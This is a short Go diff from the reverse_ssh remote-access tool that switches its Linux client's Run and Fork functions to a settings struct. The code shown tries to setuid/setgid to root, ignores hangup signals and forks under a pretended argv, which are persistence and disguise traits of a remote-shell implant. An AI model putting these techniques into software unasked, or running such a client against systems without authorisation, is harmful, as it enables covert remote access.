@@ -11,7 +11,7 @@ import (
 	"github.com/NHAS/reverse_ssh/internal/client"
 )
 
-func Run(destination, fingerprint, proxyaddress, sni string, _ bool) {
+func Run(settings *client.Settings) {
 	//Try to elavate to root (in case we are a root:root setuid/gid binary)
 	syscall.Setuid(0)
 	syscall.Setgid(0)
@@ -21,10 +21,10 @@ func Run(destination, fingerprint, proxyaddress, sni string, _ bool) {
 	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)
 
 	// on the linux platform we cant use winauth
-	client.Run(destination, fingerprint, proxyaddress, sni, false)
+	client.Run(settings)
 }
 
-func Fork(destination, fingerprint, proxyaddress, sni string, _ bool, pretendArgv ...string) error {
+func Fork(settings *client.Settings, pretendArgv ...string) error {
 
 	log.Println("Forking")
 
